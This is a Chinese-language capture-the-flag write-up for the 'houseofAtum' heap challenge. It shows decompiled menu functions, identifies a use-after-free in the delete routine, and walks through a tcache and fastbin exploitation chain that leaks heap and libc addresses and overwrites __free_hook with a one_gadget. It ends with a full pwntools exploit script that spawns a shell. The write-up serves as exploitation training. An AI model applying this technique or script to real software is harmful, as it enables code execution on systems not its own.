IDA分析

main函数

int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
{
  int v3; // eax

  initialize(argc, argv, envp);
  while ( 1 )
  {
    while ( 1 )
    {
      while ( 1 )
      {
        v3 = menu();
        if ( v3 != 2 )
          break;
        edit();
      }
      if ( v3 > 2 )
        break;
      if ( v3 != 1 )
        goto LABEL_13;
      alloc();
    }
    if ( v3 == 3 )
    {
      del();
    }
    else
    {
      if ( v3 != 4 )
LABEL_13:
        exit(0);
      show();
    }
  }
}

alloc函数

int alloc()
{
  int i; // [rsp+Ch] [rbp-4h]

  for ( i = 0; i <= 1 && notes[i]; ++i )
    ;
  if ( i == 2 )
    return puts("Too many notes!");
  printf("Input the content:");
  notes[i] = malloc(0x48uLL);
  readn(notes[i], 72LL);
  return puts("Done!");
}

alloc最多运行分配2个chunk(0x48)

edit函数

int edit()
{
  int v1; // [rsp+Ch] [rbp-4h]

  printf("Input the idx:");
  v1 = getint();
  if ( v1 < 0 || v1 > 1 || !notes[v1] )
    return puts("No such note!");
  printf("Input the content:");
  readn(notes[v1], 72LL);
  return puts("Done!");
}

通过note指针判断note是否存在

show函数

int show()
{
  int v1; // [rsp+Ch] [rbp-4h]

  printf("Input the idx:");
  v1 = getint();
  if ( v1 < 0 || v1 > 1 || !notes[v1] )
    return puts("No such note!");
  printf("Content:");
  puts((const char *)notes[v1]);
  return puts("Done!");
}

和edit函数一样，通过note指针判断note是否存在

del函数

unsigned __int64 del()
{
  int v1; // [rsp+0h] [rbp-10h]
  char v2[2]; // [rsp+6h] [rbp-Ah] BYREF
  unsigned __int64 v3; // [rsp+8h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  printf("Input the idx:");
  v1 = getint();
  if ( v1 >= 0 && v1 <= 1 && notes[v1] )
  {
    free((void *)notes[v1]);
    printf("Clear?(y/n):");
    readn(v2, 2LL);
    if ( v2[0] == 'y' )
      notes[v1] = 0LL;
    puts("Done!");
  }
  else
  {
    puts("No such note!");
  }
  return __readfsqword(0x28u) ^ v3;
}

存在UAF漏洞，当clear选择’n‘时，不会将notes数组上的指针置0

漏洞利用

首先通过泄露出heap地址

先利用UAF漏洞多次释放同一个chunk（chunk0），使其填满tcache，此时chunk0的next指针指向chunk 0的user data，此时show(0)即可泄露出heap addr

制造fake chunk泄露libc

然后释放chunk0进入fast bin

然后再次分配一个chunk（chunk0),chunk0从tcache中取出，此时counts=7-1=6，entries为空，此时得到的chunk和fastbins中的chunk重叠，我们可以在其fd域内写入伪造地址（heap_addr-0x20),fd指向的是chunk 头，则我们向heap_addr-0x10写入，即我们可以控制 chunk0的头部

tcache如下

此时再次分配一个chunk(chunk1 0x55c5be73b250),则会从fastbin中分配，其余的chunk（即伪造的fake chunk ）进入tcache

此时tcache中 counts=6+1=7，entries中指针指向fake_chunk的user data

将分配的第二个chunk （即chunk1）释放，使其进入fast bin

然后再申请一个chunk （chunk 1），即可将fake chunk从tcache 取出，然后向user data写入（即chunk 0 的头部），将chunk 0的size 改写为一个small chunk

将chunk0 的size 设置为0x90，则正好到我们起初伪造的0x11处，注意此时 chunk 1的头部为heap_addr-0x20,chunk0的头部为heap-0x10

先将tcache（0x90）填充满，然后释放chunk 0 进入unsorted bin，此时show（1）可泄露出libc地址

改写free_hook为one_gadget

edit(1)修改chunk0的fd指向free_hook-0x10

然后申请回来chunk0，此时chunk0从fastbins中分配，同时free_hook-0x10被写入tcache的entries，

释放chunk 0，再次申请chunk0即可申请到free_hook-0x10,此时edit（0），则可向free_hook中写入，我们向其中写入one_gadget,则此时释放chunk 0即可get shell。

exp

from pwn import*
p=process('./houseofAtum')
#context.log_level='debug'
libc=ELF('./libc-2.26.so')
def new(content):
    p.recvuntil('Your choice:')
    p.sendline(str(1))
    p.recvuntil('Input the content:')
    p.sendline(content)

def edit(idx,content):
    p.recvuntil('Your choice:')
    p.sendline(str(2))
    p.recvuntil('Input the idx:')
    p.sendline(str(idx))
    p.recvuntil('Input the content:')
    p.send(content)

def dele(idx,x):
    p.recvuntil('Your choice:')
    p.sendline('3')
    p.recvuntil('Input the idx:')
    p.sendline(str(idx))
    p.recvuntil('Clear?(y/n):')
    p.send(x)

def show(idx):
    p.recvuntil('Your choice:')
    p.sendline(str(4))
    p.recvuntil('Input the idx:')
    p.sendline(str(idx))

new('A')
new(p64(0)*7+p64(0x11))
dele(1,'y')
for i in range(6):
    dele(0,'n')
show(0)

p.recvuntil('Content:')
heap_addr=u64(p.recv(6).ljust(8,'\x00'))
print("heap_addr:",hex(heap_addr))


dele(0,'y')



new(p64(heap_addr-0x20))   #malloc chunk0 from tcache

new('a')                   #malloc chunk1 and the heap_addr-0x20 to tcache

dele(1,'y')                #fastbins

new(p64(0)+p64(0x91))      #chunk 1:malloc the heap_addr-0x20 overlapping the chunk 0 

for i in range(7):
    dele(0,'n')

dele(0,'y')

#now 0->heap-0x10  1->heap-0x20
edit(1,'A'*0x10)

show(1)

p.recvuntil('A'*0x10)
main_arean=u64(p.recv(6).ljust(8,'\x00'))-0x58
print('main_arean:',hex(main_arean))

libc_base=main_arean-0x3DAC20
one_gadget=libc_base+0xfcc6e

free_hook=libc_base+libc.sym["__free_hook"]

edit(1,p64(0)+p64(0x51)+p64(free_hook-0x10)) 

new('A')              #chunk 0 and free_hook-to-tcache

dele(0,'y')           #fastbins     
new(p64(one_gadget))  #chunk 0 will malloc free_hook

p.sendlineafter("choice:", '3')
p.sendlineafter(":", '0')

p.interactive()
